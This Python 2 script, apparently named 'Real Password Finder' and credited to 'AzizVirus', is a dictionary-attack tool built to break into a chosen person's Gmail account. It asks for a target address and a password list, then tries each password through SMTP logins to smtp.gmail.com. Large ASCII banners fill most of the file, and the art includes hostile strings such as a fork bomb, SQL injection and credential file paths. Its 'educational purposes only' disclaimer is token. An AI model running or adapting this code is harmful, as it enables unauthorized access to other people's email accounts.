# -*- coding: utf-8 -*-
#!/usr/bin/python
import sys
import os
import smtplib                #Importing LIbraries
import socket
import subprocess
import time
from random import randint

class bcolors:
	HEADER = '\033[95m' #move
	OKBLUE = '\033[94m' #blue
	OKGREEN = '\033[92m' #green
	WARNING = '\033[93m' #orange                                   #Defining Colors
	FAIL = '\033[91m' #red
	ENDC = '\033[0m' #end color
	BOLD = '\033[1m' #gras
	UNDERLINE = '\033[4m' #underline
        BLEUCIEL = '\033[1;36m' #bleuciel

rpfp = bcolors.BLEUCIEL + 'Real Password Finder@:' + bcolors.ENDC + ' '
start_time = time.time()

if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] Real Password Finder Tool must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")

os.system("clear")

print(""" \033[1;36m
                                  ┌═════════════════════════════════════════════════════════════════════════════┐
                                  █                                                                             █
                                  █              ツ     Executing Real Password Finder Tool     ツ              █ 
                                  █                                                                             █
                                  └═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")

time.sleep(0.25)
print ' '
print ' '
print '                  ____  _____    _    _       ____   _    ____ ______        _____  ____  ____     _____ ___ _   _ ____  _____ ____'
print '                 |  _ \| ____|  / \  | |     |  _ \ / \  / ___/ ___\ \      / / _ \|  _ \|  _ \   |  ___|_ _| \ | |  _ \| ____|  _ \.' 
print '                 | |_) |  _|   / _ \ | |     | |_) / _ \ \___ \___\.\ \ /\ / / | | |  |_) |  | |  | |_   | ||  \| | | | |  _| | |_) |' 
print '                 |  _ <| |___ / ___ \| |___  |  __/ ___ \ ___) |__) |\ V  V /| |_| |  _ <| |_| |  |  _|  | || |\  | |_| | |___|  _ < '
print '                 |_| \_\_____/_/   \_\_____| |_| /_/   \_\____/____/  \_/\_/  \___/|_| \_\____/   |_|   |___|_| \_|____/|_____|_| \_\.'
print ' '
print ' '
time.sleep(1)

print(""" \033[1;36m
                        ┌════════════════════════════════════════════════════════════════════════════════════════════════════┐
                        █                                                                                                    █ 
                        █       ツ      Real Password Finder Tool By AzizVirus Is Coded By Python On Kali Linux    ツ        █
                        █                                                                                                    █
                        └════════════════════════════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")
time.sleep(1)
print          bcolors.OKGREEN + '                ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ  ツ ツ ツ ツ ツ ツ ツ  ツ  ツ          '
print '  '
print          bcolors.OKGREEN + '                ツ ################################## Real password finder V1.0 started ###########################################  ツ         '
print ' '
print          bcolors.OKGREEN + '                ツ #####################################  !!!  Gmail Edition  !!!  ################################################  ツ           ' 
print ' '
print          bcolors.OKGREEN + '                ツ ####################  This Tool was Made by Aziz Becha, use for educational purposes only ! ####################  ツ        ' 
print ' '
print          bcolors.OKGREEN + '                ツ ##########################  This Tool Is Using Brute-Force And Dictionnary Attack !  ###########################  ツ      ' 
print '  '
print          bcolors.OKGREEN + '                ツ ##############################   Please Do Not use for illegal purposes   ######################################  ツ     ' 
print '   '
print          bcolors.OKGREEN + '                ツ ##################################  Contact me if there is some bugs   #########################################  ツ    ' 
print ' '
print  ' '
time.sleep(0.25)
print          bcolors.OKGREEN + '                ツ ######################################  Facebook: Aziz Bécha  ##################################################  ツ  '
print '  '
print          bcolors.OKGREEN + '                ツ #######################################  Developper: Aziz Becha  ###############################################  ツ     '
print '  '
print          bcolors.OKGREEN + '                ツ ####################################### CERTIFIED ETHICAL HACKER  ##############################################  ツ          '
print                            '                                                                                                                                              '
print ' '                                                                                                                                   
time.sleep(0.25)
print          bcolors.OKGREEN + '                ツ ######################################  All rights Reserved ! ! !  #############################################  ツ            '
print ' '
print          bcolors.OKGREEN + '                ツ ############################ 3> Hack Like a Pro ... Hack Like an Intelligent :) 3> #############################  ツ          '
print ' '
time.sleep(0.25)
print          bcolors.OKGREEN + '                ツ ##########################  This Tool Will Try To Find The Real Password for Gmail  ############################  ツ   '
print ' '
print          bcolors.OKGREEN + '                ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ ツ  ツ  '
print ' '
print ' ' + bcolors.ENDC + ' '
time.sleep(1.5)
def banner():
   print ' '
   print bcolors.FAIL + '                                          `:oDFo:`                            '
   print bcolors.FAIL + '                                        ./ymM0dayMmy/.                                           '
   print bcolors.FAIL + '                                    -+dHJ5aGFyZGVyIQ==+-                                        '
   print bcolors.FAIL + '                                `:sm⏣~~Destroy.No.Data~~s:`                                   '  
   print bcolors.FAIL + '                              -+h2~~Maintain.No.Persistence~~h+-                             '    
   print bcolors.FAIL + '                          `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`                         '     
   print bcolors.FAIL + '                        ./etc/shadow.0days-Data/%20OR%201=1--.No.0MN8/.                   '       
   print bcolors.FAIL + '                    -++SecKCoin++e.AMd..      `.-:   //+hbove.913.ElsMNh+-                '       
   print bcolors.FAIL + '                   -~/.ssh/id_rsa.Des-                 `htN01UserWroteMe!-              '        
   print bcolors.FAIL + '                   :dopeAW.No<nano>o                    :is:TЯiKC.sudo-.A:             '         
   print bcolors.FAIL + '                  :wedre.all.alike*`                     The.PFYroy.No.D7:             '         
   print bcolors.FAIL + '                  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:            '          
   print bcolors.FAIL + '                  :msf>elot/                                     \ggOB&s7:           '           
   print bcolors.FAIL + '                  :---srw/                                         \.No.r:             '           
   print bcolors.FAIL + '                  :<script>.Ac816/                        sENQSDG3101.404:         '             
   print bcolors.FAIL + '                  :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:        '              
   print bcolors.FAIL + '                  :09.14.2011.raid                       /STFU|wall.No.Pr:       '               
   print bcolors.FAIL + '                  :hevnsntSurb025N.                      dNVRGOING2GIVUUP:      '                
   print bcolors.FAIL + '                  :#OUTHOUSE-  -s:                       /corykennedyData:     '                 
   print bcolors.FAIL + '                  :$nmap -oS                             , , o.678306Ence:    '                  
   print bcolors.FAIL + '                 :Awsm.da:                             qdqdfl#beats3o.No.:    '                  
   print bcolors.FAIL + '                 :Ring0:                              .dDestRoyREXKC3ta/M:   '                   
   print bcolors.FAIL + '                :23d:                                  sSETEC.ASTRONMYist: '                   
   print bcolors.FAIL + '                /-                      /yo-    .ence.N:(){ :|: ddgqz& };:   '                   
   print bcolors.FAIL + '                 /                          `:Shall.We.Play.A.Game?tron/ '                      
   print bcolors.FAIL + '                  /                        ```-ooy.if1ghtf0r+ehUser5`'                         
   print bcolors.FAIL + '                   /                      ..th3.H1V3.U2VjRFNN.jMh+.`'                           
   print bcolors.FAIL + '                    /                    `MjM~~WE.ARE.se~~MMjMs '                               
   print bcolors.FAIL + '                     /                     +~KANSAS.CITYés~-` '                                  
   print bcolors.FAIL + '                      /                     J~HAKCERS~./.`  '                                    
   print bcolors.FAIL + '                       /                       .esc:wq!:`  '                                        
   print bcolors.FAIL + '                         /                         +++ATH`'                                            
   print bcolors.FAIL + '                           /  / / / / / / / / / / / / / /'     + bcolors.ENDC + ' '    
   print  ' '
   print  ' ' 
   print  ' '
   time.sleep(1)
   print ' '
   print ' '
   print ' '
   print ' '
   print bcolors.BLEUCIEL +'                    _______________________________________________________________________________'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                         *Email Checker Login Page*                          |'
   print bcolors.BLEUCIEL +'                    |_____________________________________________________________________________|'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                 User Name:          [     hacker    ]                       |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                 Password:           [     ******    ]                       |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                              Say The Magic Word                             |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                                  -[ Login ]-                                |'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |                         Forgot Password ? Click Here                        |'
   print bcolors.BLEUCIEL +'                    |_____________________________________________________________________________|'
   print bcolors.BLEUCIEL +'                    |                                                                             |'
   print bcolors.BLEUCIEL +'                    |               Bussiness Requires Only: Facebook: Aziz Bécha                 |'
   print bcolors.BLEUCIEL +'                    |               Follow Me On Github for more Tools: AzizVirus                 |'
   print bcolors.BLEUCIEL +'                    |                  © Copyright 2020.. All Rights Reserved ! ©                 |'
   print bcolors.BLEUCIEL +'                    |_____________________________________________________________________________|' + bcolors.ENDC + ' '
   print ' '
   print ' '
   print ' '
   print ' '
   time.sleep(0.75)
 
banner()

print rpfp + bcolors.BOLD + '{+} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ' # Pinging gmail alert
time.sleep(0.25)
print ' '
print rpfp + '{+/-} Checking Gmail availability was started'  #checking availability notification
print ' '
os.system("ping www.gmail.com -c 3")  #pinging gmail command 
print ' '
print rpfp + '{+} Gmail is now available to work !' #gmail availability alert
print ' '
print rpfp + bcolors.BLEUCIEL + '{+} Connecting To The Server ! ' + bcolors.ENDC + ' '
print ' '
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  #Defining the smtp server
smtpserver.ehlo()
smtpserver.starttls() #connecting to the server
print rpfp + bcolors.BLEUCIEL + '{+} Connected !' + bcolors.ENDC + ' '
print ' '
user = raw_input( rpfp + "{*} Enter the Target's Email Address ==>  ") #selecting target
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " > " + " {+} Target's email succesfully selected ! ==> " + user + bcolors.ENDC + ' '     # target selected alert
print '   '                      
passwfile = raw_input( rpfp + "(" + user + ")" + " > " + " {*} Enter the password file name ==>  ") #selecting password file
print ' '
print rpfp + bcolors.FAIL + "(" + user + ")" + " > "' {+} Password File Succesfully Selected ! ==> ' + passwfile + bcolors.ENDC + ' ' #passwordfile selected alert
print " "
time.sleep(0.25)
passwfile = open(passwfile, "r")
print rpfp + bcolors.OKBLUE + "("  + user + ")" + " > " + ' {+} Brute Force Attack will start now !  ' + bcolors.ENDC  + ' ' #bruteforce attack starting alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.WARNING + "(" + user + ")" + " > "' {+} Attack Status: Started Now !!! ' + bcolors.ENDC + ' '  #bruteforce attack started alert
print ' '
time.sleep(0.25)

for password in passwfile:
        try:
                smtpserver.login(user, password)
 
                print " [+] Password Found ==>  : %s" % password   #password found alert
                break;
        except smtplib.SMTPAuthenticationError:
                print rpfp + "(" + user + ")" + " > " + " [-] Password Incorrect ==>  : %s" % password #password incorrect alert
                                                                                                                                                                         
print rpfp + bcolors.OKGREEN + "(" + user + ")"  +  " > " + ' {+} Scanning Status: complete !' + bcolors.OKGREEN + ' '    #scan finished alert
time.sleep(0.25)
print ' '
print rpfp + bcolors.FAIL + "(" + user  + ")" + " > " + " {-} All The Passwords for " + "(" + user + ")" +  'Are Checked But No One Works ¯\_(ツ)_/¯ ' 
print '  '
print rpfp + bcolors.BLEUCIEL + "(" + user + ")" +  " > " +  ' {-} Real Password for ' + user + ' Not Found !  ' + bcolors.ENDC + ' ' #password not found alert
print '   '
print rpfp + bcolors.FAIL + "(" + user + ")" + " > " + ' {*} Try To Change The Keywords And Generate A New More Powerful Password List ¯\_(ツ)_/¯ ' + bcolors.FAIL + ' '
print ' '
print rpfp + bcolors.WARNING + "(" + user + ")" + " > " + ' {-} Your Target ' + "( " + user + " )" + ' Was not Hacked!' + bcolors.ENDC + ' '   #target not hacked alert
time.sleep(0.5)
print '   '
print rpfp + bcolors.OKGREEN + "(" + user + ")" + " > " + ' {*} Time elapsed: ' + str(time.time() - start_time) + bcolors.ENDC + ' '   #time elapsed in tool
time.sleep(0.25)
print '  '
print rpfp + bcolors.OKGREEN + "(" + user + ")" + " > " + ' {+} Good Luck Next Time ! ' + bcolors.OKGREEN + ' '
print ' '
print rpfp + bcolors.HEADER + "("  + user + ")" + " > " + ' {-} Exiting Now !' + bcolors.ENDC + ' ' #exiting alert
print ' '
print rpfp + "[-] Exit " # exit alert
print ' '
print ' '
sys.exit #exiting command
